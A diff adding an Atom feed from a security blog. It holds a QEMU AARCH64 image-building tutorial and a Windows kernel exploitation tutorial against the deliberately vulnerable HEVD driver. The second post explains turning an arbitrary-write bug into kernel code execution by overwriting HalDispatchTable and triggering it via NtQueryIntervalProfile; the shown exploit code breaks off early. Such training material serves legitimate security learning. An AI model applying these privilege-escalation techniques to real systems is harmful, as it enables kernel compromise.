@@ -1,0 +1,1205 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>BlahCats - tutorial</title><link href="https://blahcat.github.io/" rel="alternate"></link><link href="https://blahcat.github.io/feeds/tutorial.atom.xml" rel="self"></link><id>https://blahcat.github.io/</id><updated>2018-01-07T00:00:00-08:00</updated><subtitle>Tales of a binary encoded life...</subtitle><entry><title>Building a Debian Stretch QEMU image for AARCH64</title><link href="https://blahcat.github.io/posts/2018/01/07/building-a-debian-stretch-qemu-image-for-aarch64.html" rel="alternate"></link><published>2018-01-07T00:00:00-08:00</published><updated>2018-01-07T00:00:00-08:00</updated><author><name>hugsy</name></author><id>tag:blahcat.github.io,2018-01-07:/posts/2018/01/07/building-a-debian-stretch-qemu-image-for-aarch64.html</id><summary type="html">&lt;h2&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;After &lt;a href="/posts/2017/06/25/qemu-images-to-play-with.html"&gt;releasing my QEMU
+images&lt;/a&gt; and then publishing a post on &lt;a href="/posts/2017/07/14/building-a-debian-stretch-qemu-image-for-mipsel.html"&gt;how to build a QEMU image for Debian MIPSel&lt;/a&gt;, I still received many demands for information on building more VMs, and among those, the most popular one was AARCH64 (or ARM64).&lt;/p&gt;
+&lt;p&gt;If you're just interested in downloading the …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;After &lt;a href="/posts/2017/06/25/qemu-images-to-play-with.html"&gt;releasing my QEMU
+images&lt;/a&gt; and then publishing a post on &lt;a href="/posts/2017/07/14/building-a-debian-stretch-qemu-image-for-mipsel.html"&gt;how to build a QEMU image for Debian MIPSel&lt;/a&gt;, I still received many demands for information on building more VMs, and among those, the most popular one was AARCH64 (or ARM64).&lt;/p&gt;
+&lt;p&gt;If you're just interested in downloading the ready-to-use AARCH64 image, just go to the &lt;a href="https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA"&gt;Mega&lt;/a&gt; repository.&lt;/p&gt;
+&lt;h2&gt;Pre-requisite&lt;/h2&gt;
+&lt;p&gt;Just like &lt;a href=""&gt;we did earlier in the former post&lt;/a&gt;, we will proceed with the Debian
+Net Installer, so you will require:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;an Internet connection&lt;/li&gt;
+&lt;li&gt;a recent QEMU (generally &lt;code&gt;{apt,dnf} install qemu&lt;/code&gt; will suffice)&lt;/li&gt;
+&lt;li&gt;the initrd of the Debian installer&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;wget&lt;span class="w"&gt; &lt;/span&gt;http://ftp.debian.org/debian/dists/Debian9.13/main/installer-arm64/current/images/netboot/debian-installer/arm64/initrd.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+&lt;li&gt;the kernel to boot on for the installation:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;wget&lt;span class="w"&gt; &lt;/span&gt;http://ftp.debian.org/debian/dists/Debian9.13/main/installer-arm64/current/images/netboot/debian-installer/arm64/linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;You also need a hard drive to install the OS on:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-img&lt;span class="w"&gt; &lt;/span&gt;create&lt;span class="w"&gt; &lt;/span&gt;-f&lt;span class="w"&gt; &lt;/span&gt;qcow2&lt;span class="w"&gt; &lt;/span&gt;disk.qcow2&lt;span class="w"&gt; &lt;/span&gt;20G
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2&gt;Installation steps&lt;/h2&gt;
+&lt;div class="alert-info"&gt;&lt;i class="fa fa-info-circle"&gt;&amp;nbsp;Note:&lt;/i&gt; since most steps are similar with the ones described in the post before, I'll simply show the commands I've used so they can be copy/pasted for reproduction.&lt;/div&gt;
+&lt;p&gt;Start with running the installer (with 2 vCPUs and 1GB Ram):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-system-aarch64&lt;span class="w"&gt; &lt;/span&gt;-smp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-M&lt;span class="w"&gt; &lt;/span&gt;virt&lt;span class="w"&gt; &lt;/span&gt;-cpu&lt;span class="w"&gt; &lt;/span&gt;cortex-a57&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;1G&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-initrd&lt;span class="w"&gt; &lt;/span&gt;initrd.gz&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-kernel&lt;span class="w"&gt; &lt;/span&gt;linux&lt;span class="w"&gt; &lt;/span&gt;-append&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;root=/dev/ram console=ttyAMA0&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-global&lt;span class="w"&gt; &lt;/span&gt;virtio-blk-device.scsi&lt;span class="o"&gt;=&lt;/span&gt;off&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-device&lt;span class="w"&gt; &lt;/span&gt;virtio-scsi-device,id&lt;span class="o"&gt;=&lt;/span&gt;scsi&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-drive&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;disk.qcow2,id&lt;span class="o"&gt;=&lt;/span&gt;rootimg,cache&lt;span class="o"&gt;=&lt;/span&gt;unsafe,if&lt;span class="o"&gt;=&lt;/span&gt;none&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-device&lt;span class="w"&gt; &lt;/span&gt;scsi-hd,drive&lt;span class="o"&gt;=&lt;/span&gt;rootimg&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-netdev&lt;span class="w"&gt; &lt;/span&gt;user,id&lt;span class="o"&gt;=&lt;/span&gt;unet&lt;span class="w"&gt; &lt;/span&gt;-device&lt;span class="w"&gt; &lt;/span&gt;virtio-net-device,netdev&lt;span class="o"&gt;=&lt;/span&gt;unet&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-net&lt;span class="w"&gt; &lt;/span&gt;user&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-nographic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img alt="1.debian.installer.png" src="https://i.imgur.com/PAExOmJ.png"&gt;&lt;/p&gt;
+&lt;p&gt;Then, go grab a coffee while the installer does its magic:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="2.debian.installer.png" src="https://i.imgur.com/1Mgoscl.png"&gt;&lt;/p&gt;
+&lt;p&gt;And finally:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="3.debian.installer.png" src="https://i.imgur.com/IfvQpTC.png"&gt;&lt;/p&gt;
+&lt;p&gt;Now we must shutdown the VM, and extract the initrd and kernel from the image, as follow:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;apt&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;nbd-client
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;modprobe&lt;span class="w"&gt; &lt;/span&gt;nbd&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;max_part&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;qemu-nbd&lt;span class="w"&gt; &lt;/span&gt;--connect&lt;span class="o"&gt;=&lt;/span&gt;/dev/nbd0&lt;span class="w"&gt; &lt;/span&gt;disk.qcow2
+$&lt;span class="w"&gt; &lt;/span&gt;mkdir&lt;span class="w"&gt; &lt;/span&gt;mnt
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;mount&lt;span class="w"&gt; &lt;/span&gt;/dev/nbd0p1&lt;span class="w"&gt; &lt;/span&gt;mnt
+$&lt;span class="w"&gt; &lt;/span&gt;cp&lt;span class="w"&gt; &lt;/span&gt;mnt/initrd.img-4.9.0-4-arm64&lt;span class="w"&gt; &lt;/span&gt;mnt/vmlinuz-4.9.0-4-arm64&lt;span class="w"&gt; &lt;/span&gt;.
+$&lt;span class="w"&gt; &lt;/span&gt;sync
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;umount&lt;span class="w"&gt; &lt;/span&gt;/dev/nbd0p1
+$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;nbd-client&lt;span class="w"&gt; &lt;/span&gt;-d&lt;span class="w"&gt; &lt;/span&gt;/dev/nbd0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And run your VM with the kernel and initrd copied from installer:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;qemu-system-aarch64&lt;span class="w"&gt; &lt;/span&gt;-smp&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;-M&lt;span class="w"&gt; &lt;/span&gt;virt&lt;span class="w"&gt; &lt;/span&gt;-cpu&lt;span class="w"&gt; &lt;/span&gt;cortex-a57&lt;span class="w"&gt; &lt;/span&gt;-m&lt;span class="w"&gt; &lt;/span&gt;1G&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-initrd&lt;span class="w"&gt; &lt;/span&gt;initrd.img-4.9.0-4-arm64&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-kernel&lt;span class="w"&gt; &lt;/span&gt;vmlinuz-4.9.0-4-arm64&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-append&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;root=/dev/sda2 console=ttyAMA0&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-global&lt;span class="w"&gt; &lt;/span&gt;virtio-blk-device.scsi&lt;span class="o"&gt;=&lt;/span&gt;off&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-device&lt;span class="w"&gt; &lt;/span&gt;virtio-scsi-device,id&lt;span class="o"&gt;=&lt;/span&gt;scsi&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-drive&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;disk.qcow2,id&lt;span class="o"&gt;=&lt;/span&gt;rootimg,cache&lt;span class="o"&gt;=&lt;/span&gt;unsafe,if&lt;span class="o"&gt;=&lt;/span&gt;none&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-device&lt;span class="w"&gt; &lt;/span&gt;scsi-hd,drive&lt;span class="o"&gt;=&lt;/span&gt;rootimg&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-device&lt;span class="w"&gt; &lt;/span&gt;e1000,netdev&lt;span class="o"&gt;=&lt;/span&gt;net0&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-net&lt;span class="w"&gt; &lt;/span&gt;nic&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-netdev&lt;span class="w"&gt; &lt;/span&gt;user,hostfwd&lt;span class="o"&gt;=&lt;/span&gt;tcp:127.0.0.1:2222-:22,id&lt;span class="o"&gt;=&lt;/span&gt;net0&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;-nographic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;And that's it!&lt;/p&gt;
+&lt;p&gt;&lt;img alt="4.debian.installer.png" src="https://i.imgur.com/519SOdy.png"&gt;&lt;/p&gt;
+&lt;p&gt;The ready-to-use image (with gcc, gdb, gef, etc.) is available &lt;a href="https://mega.nz/#F!oMoVzQaJ!iS73iiQQ3t_6HuE-XpnyaA"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Adios ☕&lt;/p&gt;</content><category term="tutorial"></category><category term="gef"></category><category term="qemu"></category><category term="aarch64"></category></entry><entry><title>Arbitrary Write primitive in Windows kernel (HEVD)</title><link href="https://blahcat.github.io/posts/2017/08/31/arbitrary-write-primitive-in-windows-kernel-hevd.html" rel="alternate"></link><published>2017-08-31T00:00:00-07:00</published><updated>2017-08-31T00:00:00-07:00</updated><author><name>hugsy</name></author><id>tag:blahcat.github.io,2017-08-31:/posts/2017/08/31/arbitrary-write-primitive-in-windows-kernel-hevd.html</id><summary type="html">&lt;p&gt;Back again to modern Windows kernel exploitation!&lt;/p&gt;
+&lt;p&gt;After understanding &lt;a href="/posts/2017/08/14/a-primer-to-windows-x64-shellcoding"&gt;how to build shellcodes for Windows 64-bit&lt;/a&gt; and applying this knowledge on &lt;a href="/posts/2017/08/18/first-exploit-in-windows-kernel-hevd"&gt;a trivial kernel stack overflow vulnerability&lt;/a&gt; we
+are ready to start moving towards more real-life types of vulnerabilities, such
+as Type Confusion or Kernel Pool exploit, but for now …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Back again to modern Windows kernel exploitation!&lt;/p&gt;
+&lt;p&gt;After understanding &lt;a href="/posts/2017/08/14/a-primer-to-windows-x64-shellcoding"&gt;how to build shellcodes for Windows 64-bit&lt;/a&gt; and applying this knowledge on &lt;a href="/posts/2017/08/18/first-exploit-in-windows-kernel-hevd"&gt;a trivial kernel stack overflow vulnerability&lt;/a&gt; we
+are ready to start moving towards more real-life types of vulnerabilities, such
+as Type Confusion or Kernel Pool exploit, but for now we'll cover the case of
+&lt;em&gt;Arbitrary Write&lt;/em&gt;  (aka &lt;em&gt;Write-What-Where&lt;/em&gt;) vulnerabilities.&lt;/p&gt;
+&lt;p&gt;We'll use the same configuration than the one used before (target is up-to-date
+Windows 8.1 x64 VM with HEVD v.1.20 driver installed). For more info about the
+setup, refer to the first post of this Windows Kernel exploitation series.&lt;/p&gt;
+&lt;h1&gt;Recon&lt;/h1&gt;
+&lt;h2&gt;IDA to the rescue&lt;/h2&gt;
+&lt;p&gt;After not that much effort in IDA by tracing down the IOCTL dispatching function
+callgraph, we spot the function &lt;code&gt;TriggerArbitraryOverwrite()&lt;/code&gt; which can be
+reached via a IOCTL with a code of 0x22200B. The vulnerability is easy to spot:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image_alt" src="/assets/images/win-kernel-debug/hevd-www-ida-vuln-spotting.png"&gt;&lt;/p&gt;
+&lt;p&gt;After checking the address we passed and printing some kernel debug messages,
+the function copies the value dereferenced from &lt;code&gt;rbx&lt;/code&gt; (which is the function
+parameter which we control) into the 32-bit register &lt;code&gt;r11d&lt;/code&gt;. This value is then
+written at the address pointed by &lt;code&gt;rdi&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Or better summarized in assembly - &lt;code&gt;rcx&lt;/code&gt; holds the function first argument
+(see [&lt;a href="#related-links"&gt;2&lt;/a&gt;] for a good reminder about calling conventions):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;0000000000015B89 mov     r12, rcx
+[...]
+0000000000015B95 call    cs:__imp_ProbeForRead
+0000000000015B9B mov     rbx, [r12]
+0000000000015B9F mov     rdi, [r12+8]
+[...]
+0000000000015BEC mov     r11d, [rbx]
+0000000000015BEF mov     [rdi], r11d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;So as we can observe at 0x15BEF, we do have an  arbitrary write, but a partial one as we only
+can write one DWORD at a time. No big deal, since we fully control the
+destination location, we can write a QWORD by simply performing 2 writes at &lt;code&gt;ADDR_DEST&lt;/code&gt; then
+&lt;code&gt;ADDR_DEST+4&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This is pretty much it for the vulnerability: classic case of an &lt;strong&gt;Arbitrary
+Write&lt;/strong&gt; (aka &lt;strong&gt;Write-What-Where&lt;/strong&gt;). Although we are in kernel-land, we'll see that the
+exploitation approach stays the same as when such situation occurs in user-land.&lt;/p&gt;
+&lt;h2&gt;Write what ?&lt;/h2&gt;
+&lt;p&gt;So what can we do with an Arbitrary Write?&lt;/p&gt;
+&lt;p&gt;Well, just like in usermode, one of the most common approach is to transform
+this situation into a code execution, which can be done by overwriting a
+writable location in the kernel, which we'll then force a call to.
+By overwriting a function pointer with the location of our
+shellcode placed in userland, and then triggering this call from userland would
+be enough to reach our goal (and of course, assuming SMEP is off).&lt;/p&gt;
+&lt;p&gt;But in kernel-land, this is not the only approach. Another one would be to
+overwrite the current process' token by overwriting directly the
+&lt;code&gt;_SEP_TOKEN_PRIVILEGES&lt;/code&gt; and for example, provide it with the &lt;code&gt;SeDebugPrivilege&lt;/code&gt; allowing it
+to perform any further privileged operation on the system (naturally it is
+assumed here that we know the current process structure's address - through an
+infoleak or else). Back in 2012, &lt;a class="fa fa-twitter" href="https://twitter.com/cesarcer" target="_blank"&gt;@cesarcer&lt;/a&gt;  covered this very situation in his Black Hat
+presentation &lt;a href="https://web.archive.org/web/20160909195733/https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf"&gt;Easy Local Windows Kernel Exploitation&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Although this second way would allow to work around SMEP, for the sake of
+this post we'll go with the first approach as it is the most commonly used.&lt;/p&gt;
+&lt;h2&gt;Write where ?&lt;/h2&gt;
+&lt;p&gt;The kernel has plenty of function pointer arrays that we could
+use for our purpose. One of the first we could think of would be the system calls table. The
+&lt;em&gt;System Service Descriptor Table&lt;/em&gt; (SSDT) is usually known for being hooked, as
+this table contains the service tables in use when processing system calls. In
+KD, we can reach it at with the following symbol: &lt;code&gt;nt!KeServiceDescriptorTable&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt; dps nt!KeServiceDescriptorTable
+fffff802`f8b57a80  fffff802`f895ad00 nt!KiServiceTable
+fffff802`f8b57a88  00000000`00000000
+fffff802`f8b57a90  00000000`000001b1
+fffff802`f8b57a98  fffff802`f895ba8c nt!KiArgumentTable
+fffff802`f8b57aa0  00000000`00000000
+fffff802`f8b57aa8  00000000`00000000
+fffff802`f8b57ab0  00000000`00000000
+fffff802`f8b57ab8  00000000`00000000
+fffff802`f8b57ac0  fffff802`f895ad00 nt!KiServiceTable
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;I've actually decided to use another way described very well on &lt;a href="http://poppopret.blogspot.ca/2011/07/windows-kernel-exploitation-basics-part.html"&gt;Xst3nZ&lt;/a&gt;'s blog, by overwriting the &lt;code&gt;HalDispatchTable&lt;/code&gt;. The reason this table is particularly interesting, is that it can be fetched from userland by mapping &lt;code&gt;ntoskrnl.exe&lt;/code&gt; and using &lt;code&gt;GetProcAddr("HalDispatch")&lt;/code&gt; to know its offset. As a result, we'll have a much more portable exploit code (rather than hardcoding the offset by hand).&lt;/p&gt;
+&lt;p&gt;But why &lt;code&gt;HalDispatchTable&lt;/code&gt; in particular? Because we can call from userland the undocumented
+function &lt;a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/profile/queryinterval.htm"&gt;&lt;code&gt;NtQueryIntervalProfile&lt;/code&gt;&lt;/a&gt;, that will in turn invoke &lt;code&gt;nt!KeQueryIntervalProfile&lt;/code&gt; in the kernel, which to
+finally perform a &lt;code&gt;call&lt;/code&gt; instruction to the address in &lt;code&gt;nt!HalDispatchTable[1]&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kd&amp;gt;  u nt!KeQueryIntervalProfile+0x9 l7
+nt!KeQueryIntervalProfile+0x9:
+fffff802`f8cbc23d ba18000000      mov     edx,18h
+fffff802`f8cbc242 894c2420        mov     dword ptr [rsp+20h],ecx
+fffff802`f8cbc246 4c8d4c2450      lea     r9,[rsp+50h]
+fffff802`f8cbc24b 8d4ae9          lea     ecx,[rdx-17h]
+fffff802`f8cbc24e 4c8d442420      lea     r8,[rsp+20h]
+fffff802`f8cbc253 ff15af83deff    call    qword ptr [nt!HalDispatchTable+0x8 (fffff802`f8aa4608)]  &amp;lt;-- this is interesting!
+fffff802`f8cbc259 85c0            test    eax,eax
+fffff802`f8cbc25b 7818            js      nt!KeQueryIntervalProfile+0x41 (fffff802`f8cbc275)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;So if we use the WWW vulnerability to overwrite &lt;code&gt;nt!HalDispatchTable[1]&lt;/code&gt; with
+the address of our shellcode mapped in a RWX location in userland, then
+use the undocumented &lt;code&gt;NtQueryIntervalProfile&lt;/code&gt; to trigger it, we will make the
+kernel execute our shellcode! And game over :)&lt;/p&gt;
+&lt;p&gt;For those unfamiliar with the &lt;a href="https://wiki.osdev.org/Hardware_Abstraction_Layer"&gt;Hardware Abstraction Layer (or HAL)&lt;/a&gt;,
+it is a software layer aiming to provide a common unified interface to heterogeneous hardware (motherboard, CPUs, network cards, etc.). On Windows, it resides in &lt;a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-hal-library"&gt;&lt;code&gt;hal.dll&lt;/code&gt;&lt;/a&gt; that is invoked by &lt;code&gt;ntoskrnl.exe&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;~/tmp/win81/mnt/Windows/System32/&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;hugsy@ph0ny&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;02&lt;/span&gt;:43&lt;span class="o"&gt;]&lt;/span&gt;
+➜&lt;span class="w"&gt;  &lt;/span&gt;py&lt;span class="w"&gt; &lt;/span&gt;list_imports.py&lt;span class="w"&gt; &lt;/span&gt;./ntoskrnl.exe
+Listing&lt;span class="w"&gt; &lt;/span&gt;IMPORT&lt;span class="w"&gt; &lt;/span&gt;table&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./ntoskrnl.exe&amp;#39;&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;HAL.dll
+&lt;span class="w"&gt;        &lt;/span&gt;0x140349070&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalGetVectorInput
+&lt;span class="w"&gt;        &lt;/span&gt;0x140349078&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalSetEnvironmentVariable
+&lt;span class="w"&gt;        &lt;/span&gt;0x140349080&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalGetEnvironmentVariable
+&lt;span class="w"&gt;        &lt;/span&gt;0x140349088&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalInitializeOnResume
+&lt;span class="w"&gt;        &lt;/span&gt;0x140349090&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalAllocateCrashDumpRegisters
+&lt;span class="w"&gt;        &lt;/span&gt;0x140349098&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalGetMemoryCachingRequirements
+&lt;span class="w"&gt;        &lt;/span&gt;0x1403490a0&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalProcessorIdle
+&lt;span class="w"&gt;        &lt;/span&gt;0x1403490a8&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;HalGetInterruptTargetInformation
+&lt;span class="w"&gt;        &lt;/span&gt;0x1403490b0&lt;span class="w"&gt; &lt;/span&gt;:&lt;span class="w"&gt; &lt;/span&gt;KeFlushWriteBuffer
+&lt;span class="o"&gt;[&lt;/span&gt;...&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Speaking of the HAL, &lt;code&gt;hal.dll&lt;/code&gt; has some very interesting properties
+exploitation-wise. Among others, my first attempt was to overwrite the
+pointers table located at &lt;code&gt;0xFFD00000&lt;/code&gt; (on x86 and x64). Actually the range
+&lt;code&gt;0xFFD00000-0xFFE00000&lt;/code&gt; is interesting because since the HAL driver is loaded so early (actually
+even before the Windows memory manager) during the boot process, it'll require
+known static addresses to map and store information collected about the hardware
+in memory. Researchers such as
+ &lt;a class="fa fa-twitter" href="https://twitter.com/d_olex" target="_blank"&gt;@d_olex&lt;/a&gt; have explored this path as early as 2011 to use it as an exploit vector as Win7
+SP1 used to have this section static and with Read/Write/Execute permission
+(although it exists on Windows 8 and up, it is "only" Read/Write)&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Windows 8.1 HAL section" src="/assets/images/win-kernel-debug/hevd-www-hal-interrupt.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Looking for references about HAL interrupt table corruption, I came across this recent and fantastic
+&lt;a href="https://labs.bluefrostsecurity.de/blog/2017/05/11/windows-10-hals-heap-extinction-of-the-halpinterruptcontroller-table-exploitation-technique/"&gt;blog post&lt;/a&gt; by &lt;a class="fa fa-twitter" href="https://twitter.com/NicoEconomou" target="_blank"&gt;@NicoEconomou&lt;/a&gt; that covers exactly this approach. I might dedicate a future post applying this technique to HEVD as this table is also an excellent target for WWW scenario.&lt;/p&gt;
+&lt;h1&gt;Building the exploit&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Some convenience functions of this exploit are located in
+the &lt;a href="https://github.com/hugsy/hevd/blob/feb6d67ca5f5f3c0718042b42e22adbeee6aee62/KePwnLib.h"&gt;&lt;code&gt;KePwnLib.h&lt;/code&gt;&lt;/a&gt; library I wrote. Feel free to use it!&lt;/p&gt;
+&lt;p&gt;The very first part of the exploit is very similar to what we did in the former post, with the new IOCTL code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;// Get the device handle&lt;/span&gt;
+&lt;span class="cp"&gt;#define IOCTL_HEVD_ARBITRARY_OVERWRITE 0x22200b&lt;/span&gt;
+
